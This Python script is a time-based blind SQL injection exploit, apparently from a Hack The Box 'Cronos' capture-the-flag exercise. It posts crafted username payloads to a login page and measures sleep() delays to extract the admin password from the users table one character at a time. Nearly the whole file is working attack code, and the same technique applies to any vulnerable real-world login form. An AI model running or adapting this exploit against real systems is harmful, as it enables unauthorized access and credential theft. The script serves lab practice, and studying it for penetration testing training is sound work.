#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

# variable to store the timeout of queries
sleep = 0

# sets the timeout for query validation to 5 if no argument has been passed or to the value passed as an argument
if len(sys.argv) == 1:
	sleep = 5
else:
	sleep = int(sys.argv[1])

def def_handler(sig, frame):
	log.failure("Exiting")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyz0123456789.:*@#$%^&-_=()!ยก\/{}[]'
result = ''

def check(payload):
	data_post = {
		'username': '%s' % payload,
		'password': 'test'
	}
	time_start = time.time()
	content = requests.post(url, data=data_post)
	time_end = time.time()
	if time_end - time_start > sleep:
		return 1

p1 = log.progress("Password")
p2 = log.progress("Payload")

# variable to control blanks
cont = 0

for i in xrange(1, 40):
	# If you have added more than 2 times without finding a character, it is understood that they are blank characters, the search for that column is terminated.
	if ( cont > 2 ):
		print("[!] three blank characters in a row. We move on to the next iteration")
		break

	for c in s:
		payload = "' or if(substr((select password from users where username='admin'),%d,1)='%c',sleep(%d),1)-- -" % (i,c,sleep)
		p2.status("%s" % payload)

		if check(payload):
			result += c
			p1.status("%s" % result)
			# if it has found a match it resets the blank character counter to allow spaces between the words that form the name
			cont = 0
			break

	# if it has scrolled through all the characters it means that it has not found any match, 1 is added to blank characters
	cont = cont + 1

p1.success("%s" % result)
result = ''